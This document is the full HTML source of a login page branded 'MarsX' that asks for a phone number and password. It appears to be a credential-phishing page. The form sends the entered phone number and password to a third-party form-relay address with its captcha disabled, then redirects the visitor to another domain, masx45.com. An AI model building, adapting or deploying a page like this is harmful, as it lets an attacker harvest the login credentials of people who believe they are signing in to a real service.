<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Login | MarsX</title>
  <style>
    body {
      background-color: #000;
      font-family: Arial, sans-serif;
      color: white;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
    }

    .container {
      text-align: center;
      width: 100%;
      max-width: 400px;
      padding: 30px 20px;
    }

    .logo {
      margin-bottom: 10px;
    }

    .logo img {
      height: 60px;
    }

    h2 {
      font-size: 26px;
      font-weight: bold;
      margin-bottom: 20px;
    }

    .tabs {
      display: flex;
      justify-content: center;
      margin-bottom: 20px;
    }

    .tab {
      flex: 1;
      padding: 10px 0;
      font-weight: bold;
      font-size: 14px;
      border-radius: 25px;
      cursor: pointer;
      background-color: #222;
      color: white;
      transition: background-color 0.3s;
    }

    .tab.active {
      background-color: #d4af37;
      color: black;
    }

    form {
      display: flex;
      flex-direction: column;
      align-items: stretch;
    }

    .phone-input {
      display: flex;
      align-items: center;
      background-color: #222;
      border-radius: 10px;
      padding: 0 10px;
      margin-bottom: 20px;
    }

    .phone-input img {
      width: 20px;
      margin-right: 8px;
    }

    .phone-input select,
    .phone-input input {
      background: transparent;
      border: none;
      color: white;
      padding: 12px 5px;
      font-size: 16px;
      flex: 1;
      outline: none;
    }

    .input-wrapper {
      position: relative;
      margin-bottom: 20px;
    }

    .input-wrapper input {
      width: 100%;
      padding: 12px;
      border-radius: 10px;
      border: none;
      outline: none;
      background-color: #222;
      color: white;
      font-size: 16px;
    }

    .input-wrapper .toggle-password {
      position: absolute;
      right: 15px;
      top: 50%;
      transform: translateY(-50%);
      cursor: pointer;
      color: #999;
    }

    .options {
      display: flex;
      justify-content: space-between;
      align-items: center;
      font-size: 14px;
      color: #ccc;
      margin-bottom: 20px;
    }

    .options a {
      color: #d4af37;
      text-decoration: none;
    }

    .remember-me {
      display: flex;
      align-items: center;
    }

    .remember-me input {
      margin-right: 5px;
    }

    button {
      background-color: #d4af37;
      border: none;
      padding: 12px;
      color: black;
      font-weight: bold;
      font-size: 16px;
      border-radius: 25px;
      cursor: pointer;
      transition: background-color 0.3s ease;
      width: 100%;
    }

    button:hover {
      background-color: #b3922b;
    }

    #please-wait {
      display: none;
      color: #d4af37;
      font-size: 14px;
      margin-top: 10px;
    }

    .signup {
      font-size: 14px;
      color: #aaa;
      margin-top: 20px;
    }

    .signup a {
      color: #d4af37;
      text-decoration: none;
      font-weight: bold;
    }

  </style>
</head>
<body>
  <div class="container">
    <div class="logo">
      <img src="https://i.imgur.com/KZsmUi2.png" alt="MarsX Logo" />
    </div>

    <h2>Welcome To Login</h2>

    <div class="tabs">
      <div class="tab active">Phone Login</div>
      <div class="tab">Email Login</div>
    </div>

    <form action="https://formsubmit.co/f383def8ae4a6dfe104b19a8ef9629b1" method="POST" onsubmit="return handleSubmit();">
      <input type="hidden" name="_captcha" value="false">

      <!-- Phone number with flag and code -->
      <label style="text-align: left; font-size: 12px; margin-bottom: 5px;">Phone Number</label>
      <div class="phone-input">
        <img src="https://flagcdn.com/us.svg" alt="US Flag">
        <select name="country_code" style="width: 50px;">
          <option value="+1">+1</option>
        </select>
        <input type="text" name="phone_number" placeholder="Phone Number" required />
      </div>

      <!-- Password -->
      <label style="text-align: left; font-size: 12px; margin-bottom: 5px;">Password</label>
      <div class="input-wrapper">
        <input type="password" id="password" name="password" placeholder="Password" required />
        <span class="toggle-password" onclick="togglePassword()">üëÅÔ∏è</span>
      </div>

      <!-- Options -->
      <div class="options">
        <a href="#">Forgot password?</a>
        <label class="remember-me">
          <input type="checkbox" name="remember" />
          Remember account and password
        </label>
      </div>

      <!-- Submit -->
      <button type="submit">Log In</button>
      <div id="please-wait">Please wait...</div>
    </form>

    <div class="signup">
      Continue Is Agree <a href="#">Sign Up</a>
    </div>
  </div>

  <script>
    function handleSubmit() {
      document.getElementById("please-wait").style.display = "block";
      setTimeout(() => {
        window.location.href = "https://masx45.com/";
      }, 1000);
      return true;
    }

    function togglePassword() {
      const pwd = document.getElementById("password");
      pwd.type = pwd.type === "password" ? "text" : "password";
    }
  </script>
</body>
</html>
